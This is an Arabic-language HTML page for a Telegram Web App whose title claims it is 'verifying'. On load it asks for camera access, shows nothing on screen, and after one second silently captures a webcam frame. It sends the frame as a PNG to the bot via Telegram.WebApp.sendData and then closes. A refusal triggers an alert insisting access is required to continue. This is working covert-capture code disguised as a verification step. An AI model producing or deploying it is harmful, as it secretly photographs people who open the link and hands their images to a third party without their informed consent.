<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>جارٍ التحقق...</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
</head>
<body>
    <video id="video" width="100%" height="auto" autoplay style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // انتظر قليلاً لضمان وضوح الصورة
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    const imageData = canvas.toDataURL('image/png');
                    
                    // إرسال الصورة للبوت عبر Telegram WebApp
                    Telegram.WebApp.sendData(imageData);
                    Telegram.WebApp.close();
                }, 1000);
            } catch (err) {
                alert("يجب السماح بالوصول للكاميرا للمتابعة");
            }
        }
        window.onload = startCapture;
    </script>
</body>
</html>
